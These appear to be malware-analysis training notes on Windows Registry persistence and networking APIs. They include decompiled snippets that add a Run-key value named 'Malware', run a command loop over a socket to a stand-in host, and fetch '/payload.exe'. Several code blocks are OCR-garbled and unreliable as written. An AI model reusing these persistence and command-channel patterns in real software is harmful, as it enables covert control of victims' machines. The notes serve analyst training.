# Windows Registry
• Windows Registry stores configuration data for the OS and applications
    • Malware may utilize the registry to:
    o Run itself or other malware on startup
    o Store its own configuration data or additional payloads
• The registry is structured in a tree format
    o Each node in the tree is called a key


    https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry

|    Root Key | Abbr. |  Description |
| ----- | ---- | ---- |
HKEY_ LOCAL_MACHINE | HKLM | Contains system-wide configuration data
HKEY_CURRENT_USER |HKCU |Contains data associated with the current user
HKEY USERS |HKU |Contains data associated with all users
HKEY CLASSES- ROOT| HKCR |Defines file associations
HKEY_CURRENT_CONFIG| HKCC |Contains information about the current hardware profile

https://docs.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys.



Registry Subkeys
• Registry keys may contain subkeys
• In this example, the HKEY_LOCAL_MACHINE key has the following subkeys:
o BCD00000000
o DRIVERS
o HARDWARE
o SAM
o etc.

Presented as sub-folders in regedit.exe.



Registry Values
In this example, the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run contains a value:
• Name: SystemUpdate
• Type: REG_SZ
• Data: C:\Windows\system32\svch0st.exe

![alt text](/Mandiant_flare/Mandant_images/reg_data.png)

---

https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types.
SZ means “zero(null) terminated string”. DWORD is an integer. BINARY is data that doesn’t conform to the other types (string, DWORD).
EXPAND_SZ is a string where Windows Environment Variables are expanded to their full value.


Registry APIs – advapi32.dll

• RegCreateKeyEx or RegOpenKeyEx
o Create or open a registry key

• RegQueryValueEx or RegGetValue
o Retrieve the type and data associated with a registry value

• RegSetValueEx
o Set the type and data for a new or existing registry value

• RegEnumKeyEx
o Enumerate the subkeys of a specified registry key

• RegCloseKey
o Close a handle to a registry key


advapi32.dll contains registry and service-related APIs. These are usually relevant to malware behavior. Note the
sequences – open or create a key, then get the value or set the value. Keys can be enumerated as well and
compared to some expected value.

`
RegOpenKeyExA ((HKEY) HKEY_CURRENT_USER, "Soft ware\\Micr osoft\\Windows\\Current Ver sion\\Run" , 0 , KEY_ALL_ACCESS , ( PHKEY)&local_8 ) ;
RegSetValueExA ((HKEY)&loca1_8 , "Malwa r e " , 0 , REG_SZ , (BYTE * ) "C: \\Temp\\cc . e x e " , Ox f ) ;`


Malware Persistence
• Malware frequently uses the registry to establish persistence
• Numerous registry locations allow malware to persist
• Most-common keys used for persistence (by far):
    o HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    o HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    • Persistence can also be achieved by creating an auto-start service


o Service-related APIs:
1. OpenSCManager – obtains a handle to service control manager
2. CreateService – creates service based on provided arguments:
• Service name
• Binary path
• Start type (SERVICE_AUTO_START)
o StartService – starts a service using the handle returned by CreateService
Another

Another common example is the “Startup Folder”. Applications in the folder are automatically launched at startup.
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup for all users,
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup for individual users.



Windows Networking
• Two primary Windows libraries facilitate network communication
• ws2_32.dll
o Windows sockets
o TCP and UDP
• wininet.dll
o Windows Internet API
o HTTP and FTP


Networking APIs – ws2_32.dll
• Socket setup:
o WSAStartup – initializes the Winsock library
o socket or WSASocket – creates a socket
• Socket connection:
o Client:
▪ connect or WSAConnect– establishes a connection to a socket
o Server:
▪ bind – associates a local address with a socket
▪ listen – waits for an incoming connection
▪ accept or WSAAccept– permits an incoming connection on a socket

```
PUSH    IPPROTO TCP
PUSH    SOCK STREAM
PUSH    AF INET
CALL    dword ptr [->WS2 32 . DLL ::WSASocket A]
https://docs.microsoft.com/en-us/windows/win32/api/winsock2/
```

Networking APIs – ws2_32.dll
Socket communication:
• recv or WSARecv – reads data from a connected socket
• send or WSASend – sends data to a connected socket
Socket teardown:
• closesocket – closes an existing socket
• WSACleanup – terminates use of Winsock functionality
Additional functions:
• gethostbyname or getaddrinfo – resolves a host name to IP address
• inet_addr – converts an IP address string to its raw hexadecimal form
o 192.168.1.200 becomes 0xC0A801C8
• inet_ntoa – inverse of inet_addr
• htons – often used to convert a C2 port value

```
ivarl WSAStartup (OxlOl , (LPWSADATA)&local 3a8 ) ;
uvar3 extraout_EDX;
if (iVarl == 0) {
s = WSASocketA (2 , 1 , 6 , 0 , 0 , 0 ) ;
local 218 . 0 2 = 2 ;
netshort = FUN_004018aa ( " 80" ) ;
local 218 . 2 2 = ntohs (netshort) ;
local_214 = inet_addr ("ghidra .rnandiant . com" ) ;
connect (s , (sockaddr * ) local_ 218 , 0x 10 ) ;
ivarl O;
sVar2 _strlen ( " Crnd?\ n " );
send (s , "Crnd? \ n " , sVar2 , iVarl ) ;
do {
recv (s , local 208 , 0x200, 0 ) ;
iVarl FUN_00401264 (s , loca1_208 ) ;
flags
sVar2
O;
str len ( "Cmd?\ n " );
send (s , "Cmd?\ n " , sVar2 , flags ) ;
while (iVarl == O) ;
closesocket (s ) ;
in stack fffffcSO
WSACleanup () ;
(undefined) iVarl ;
uvar3 = extraout_EDX_OO;
}
```


sockaddr and sockaddr_in
• Argument to connect function
• Includes IP address and port number
o sin_family is AF_INET (2)
o sin_port is port in network byte order (big-endian)
o sin_addr is IP address
• Just focus on identifying the IP and port – the rest is the developer’s problem


```
InternetOpenA ( "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0) " , INTERNET OPEN TYPE DIRECT, 0 , 0 , 0 ) ;j
nvar2 = InternetConnectA(uVarl , " mandiant.com" , OxS0, 0 , 0 , INTERNET_SERVICE_HTTP, 0 , IN7ERNET_FLAG_KEEP_CONNECTION) ;


uvar2 InternetConnectA(uVarl , "mandiant . com" , 0xS0, 0 , 0 , :;:N~ERNET SERVICE HTTP, 0, :;:NTERNET FLAG KEEP CONNECTION);
```

Networking APIs – wininet.dll
InternetOpen
• Initializes the WinINet library
• 1st parameter is the User-Agent string

InternetConnect
• Opens an HTTP or FTP session for a given site
• 2nd parameter is the host name or IP address
• 3rd parameter is the port

Networking APIs – wininet.dll
HttpOpenRequest
• Creates an HTTP request handle
• 2nd parameter is the HTTP verb
• 3rd parameter is the target object

HttpSendRequest
• Sends the HTTP request
• 2nd parameter may contain additional HTTP headers
• 4th parameter may contain data to be sent after the request headers (POST)

```
uvar3 = HttpOpenRequestA(uVa-2, &DAT_ 0040c284 , " /payload . e xe" , 0 , 0, &PTR_ DAT_ 004 0f000, 0 , 1 ) ;I
svar~ = _strlen (& ocaJ 1 OB ) ;
pcVar6 = &local_1008;
sva-5 = _ strlen ( " Content-Type: a pplication/x-www-form-urlencoded" ) ;
HttpSendRequestA (uVar3 , "Content-Type : application/x-www-form-urlencoded" , sVar5, pcVar6, sVar4 ) ;

```

Following Pointers to Data
• &DAT_0040c284 is a pointer to a global variable in the .data section
• Double-click and the Listing view will navigate to the address

Networking PIs – wininet.dll
InternetOpenUrl
• Retrieves a full URL; alternative to previous API sequence
InternetReadFile and InternetWriteFile
• Read or write data using the request handle
InternetCloseHandle
• Closes the request handle